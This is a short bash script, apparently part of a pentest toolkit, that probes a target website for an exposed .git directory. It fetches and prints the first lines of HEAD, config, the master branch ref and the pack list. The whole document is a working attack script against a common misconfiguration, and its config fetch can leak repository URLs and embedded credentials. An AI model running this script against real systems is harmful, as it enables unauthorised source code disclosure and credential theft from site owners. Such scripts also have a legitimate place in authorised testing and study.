#!/bin/bash
# Dump .git source code disclosure
# Usage: git_dump.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1}"
BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')

echo "=== Git Dump ==="
cd /tmp && rm -rf git_dump 2>/dev/null || true
for f in HEAD config refs/heads/master objects/info/packs; do
    echo "--- $f ---"
    curl -s "$BASE/.git/$f" --max-time 5 2>/dev/null | head -5 || true
done
echo "GIT_DUMP_DONE"
